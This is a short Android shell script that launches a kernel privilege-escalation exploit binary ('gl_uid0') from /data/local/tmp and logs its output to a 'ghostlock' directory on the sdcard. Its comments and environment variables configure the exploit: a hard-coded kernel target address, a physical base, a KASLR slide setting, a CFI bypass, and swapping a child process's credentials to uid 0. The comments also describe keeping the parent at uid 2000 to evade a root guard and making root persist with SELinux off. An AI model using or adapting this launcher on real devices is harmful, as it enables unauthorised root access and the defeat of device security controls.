#!/system/bin/sh
# Same-process: W1 PLAIN park (Permissive) then W2 child cred.
# Parent stays 2000 so ROOTGUARD does not SIGKILL the pselect.
# Child uid0 under Permissive can persist (Z33 + MAC off).
export MODE4_ONLY=1
export MODE4_SLIDE_ZERO=1
export DATAONLY_TARGET=0x2a793c8
export MODE4_SWAP_NOCFI=1
export MODE4_UID0=1
export UID0_PREFER_CHILD=1
export KPHYS=0xa8000000
export CORE_SEL=7
export GHOSTLOCK_LIVE_SYNC=/sdcard/ghostlock/aarif/live_sync.log
export GHOSTLOCK_STAGE=/sdcard/ghostlock/aarif/stage.txt
export GHOSTLOCK_PROOF=/sdcard/ghostlock/aarif/proof.log
cd /data/local/tmp
BIN=${BIN:-/data/local/tmp/gl_uid0}
exec "$BIN" >> /data/local/tmp/parkchild.txt 2>&1
